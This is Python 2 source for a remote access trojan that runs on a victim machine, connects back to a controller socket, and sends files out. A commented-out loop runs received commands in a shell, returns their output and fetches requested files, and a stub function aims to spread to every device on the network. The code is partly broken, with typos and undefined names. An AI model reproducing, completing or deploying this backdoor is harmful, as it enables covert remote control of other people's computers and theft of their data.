1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
#!/usr/bin/python

############################
## Runs on Traget Machine ##
############################

import os
import sys
import time
import socket
import subprocess



class RAT:

	_sock = None
	_port = None
	_loop = None
	BUFFER = 1024
	SIG = "ACTIVE\r\n\n"
	PASS = "DONE\r\n\n"
	FAIL = "FILE_NONE\r\n\n"
	FLAG = False


	# constructor
	def __init__(self):
		self.start()


	# initializer
	def init(cls):
		# set new socket 
		cls._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# set loopback address
		cls._loop = "127.0.0.1" #socket.gethostbyname("localhost")
		# set new port
		cls._port = 4434	


	# send data
	def send(cls, cmd):
		cls._sock.sendall(cmd)

	# receive data
	def receive(cls):
		data = ''
		pkt = cls._sock.recv(cls.BUFFER)
		while(pkt):
			data += pkt
			if(data):
				break
			else:
				pkt = sock.revc(cls.BUFFER)
		return data

	# bind connection
	def connect(cls, addr, port):
		cls._sock.connect((addr, port))
		

	# stop socket connection
	def stop(cls):
		cls._sock.close()

	# kill socket connection
	def kill(cls):
		cls._sock.close()
		del(cls._sock)
		sys.exit()


	# send file to socket
	def sftp(cls, path):
		if(os.path.exists(path)):
			f = open(path, 'rb')
			pkt = f.read(cls.BUFFER)
			while pkt != '':
				cls.send(pkt)
				pkt = f.read(cls.BUFFER)
			cls.send(cls.PASS)
			f.close()
		else:
			cls.send(cls.FAIL)


	# infest all devices in the net
	def infestation(cls):
		# TODO --
		"""
			Try to fine a way to infest all devices in the network
		"""
		cls.send("NOT READY YET!")


	# start the service
	def start(cls):
		while True:			
			try:
				cls.init()
				cls.connect(cls._loop, cls._port)
			
				data = cls.receive()
				if(data == "Activate"):
					cls.FLAG = True
					cls.send("\n" + os.getcwd() + "> ")

			except socket.error as e:
				# Connection refused
				if(e[0] is 61):
					cls.stop()
					time.sleep(10)
					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
					continue


	
def main():
	rat = RAT()


if __name__ == '__main__':
	main()





	# # connect to socket and look of commands
	# def start(cls):
	# 	while True:
	# 		try:
	# 			cls.init()
	# 			cls.send(cls.SIG)
	# 			cls.receive(cls.)

	# 			cmd = cls.receive(cls.BUFFER)
	# 			if('kill' in cmd):
	# 				cls.stop()
	# 				break
	# 			elif('get' in cmd):
	# 				g,p = cmd.split(' ')
	# 				try:
	# 					cls.sftp(cls._sock, p)	
	# 				except Exception as e:
	# 					cls.send(str(e))
	# 					pass
	# 			elif('brodcast' in cmd):
	# 				try:
	# 					cls.infestation()
	# 				except Exception as e:
	# 					cls.send(str(e))
	# 			else:
	# 				CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	# 				cls.send(CMD.stdout.read())
	# 				cls.send(CMD.stderr.read())
	# 		except socket.error as e:
	# 			print "-------"
	# 			# Socket is not connected
	# 			if(e[0] is 57):
	# 				cls.stop()
	# 				print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
	# 				time.sleep(10)		
	# 				continue
	# 			# Bad file descriptor
	# 			elif(e[0] is 9):
	# 				cls.stop()
	# 				print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
	# 				time.sleep(10)
	# 				continue
	# 			# Broken Pipe
	# 			elif(e[0] is 32):
	# 				cls.stop()
	# 				print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
	# 				time.sleep(10)
	# 				continue
	# 			else:
	# 				cls.stop()
	# 				print "CODE: {}\nMSG: {}".format(str(e[0]), str(e[1]))
	# 				time.sleep(10)
	# 				continue

